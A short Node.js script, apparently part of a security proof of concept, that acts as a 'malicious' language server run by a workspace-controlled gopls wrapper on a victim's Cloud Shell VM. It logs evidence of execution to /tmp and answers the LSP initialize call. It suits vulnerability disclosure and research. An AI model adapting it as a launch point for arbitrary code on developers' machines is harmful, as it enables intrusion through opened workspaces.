#!/usr/bin/env node
// Minimal malicious LSP server — executed by gopls-wrapper on the victim's
// Cloud Shell VM. Speaks just enough JSON-RPC to answer `initialize`; the
// evidence of execution is what matters (wrapper markers, /tmp logs, OOB beacon).

const fs = require('fs');

// Durable evidence: this process only exists if the Go extension spawned
// the workspace-controlled wrapper.
try {
  fs.appendFileSync(
    '/tmp/lsp-server-exec.log',
    `[lsp-server] ${new Date().toISOString()} executed: pid=${process.pid} ` +
    `ppid=${process.ppid} user=${process.env.USER} cwd=${process.cwd()}\n`
  );
} catch (e) { /* ignore */ }

console.error('[lsp-server] LSP server ready — waiting for client connection on stdio');

// Minimal LSP framing loop: parse Content-Length headers, answer initialize.
let buffer = Buffer.alloc(0);
process.stdin.on('data', (chunk) => {
  buffer = Buffer.concat([buffer, chunk]);
  for (;;) {
    const headerEnd = buffer.indexOf('\r\n\r\n');
    if (headerEnd === -1) return;
    const m = buffer.slice(0, headerEnd).toString().match(/Content-Length: (\d+)/i);
    if (!m) return;
    const len = parseInt(m[1], 10);
    if (buffer.length < headerEnd + 4 + len) return;
    const body = buffer.slice(headerEnd + 4, headerEnd + 4 + len).toString();
    buffer = buffer.slice(headerEnd + 4 + len);
    try {
      const msg = JSON.parse(body);
      if (msg.method === 'initialize') {
        const out = JSON.stringify({
          jsonrpc: '2.0',
          id: msg.id,
          result: { capabilities: { textDocumentSync: 1 } }
        });
        process.stdout.write(`Content-Length: ${Buffer.byteLength(out)}\r\n\r\n${out}`);
      }
    } catch (e) { /* ignore */ }
  }
});
process.stdin.on('end', () => process.exit(0));
